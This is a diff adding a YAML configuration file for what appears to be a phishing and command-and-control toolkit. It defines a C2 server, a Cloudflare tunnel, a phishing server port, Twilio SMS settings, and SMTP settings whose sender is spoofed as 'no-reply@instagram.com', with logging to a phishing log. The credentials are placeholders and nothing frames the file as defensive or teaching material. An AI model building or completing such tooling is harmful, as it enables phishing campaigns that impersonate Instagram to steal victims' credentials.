@@ -1,0 +1,33 @@
+# === C2 SERVER ===
+c2:
+  host: "0.0.0.0"
+  port: 5000
+
+# === TUNNEL ===
+tunnel:
+  type: "cloudflare"
+  subdomain: "auto"
+
+# === PHISHING ===
+phishing:
+  default_port: 8080
+  cleanup_delay: 300
+
+# === SMS (Twilio) ===
+twilio:
+  sid: "ACxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+  token: "your_auth_token"
+  from: "+1234567890"
+
+# === EMAIL (SMTP) ===
+smtp:
+  server: "smtp.gmail.com"
+  port: 587
+  user: "your.email@gmail.com"
+  pass: "your_app_password"
+  spoof_from: "no-reply@instagram.com"
+
+# === LOGGING ===
+logging:
+  level: "INFO"
+  file: "logs/phish.log"
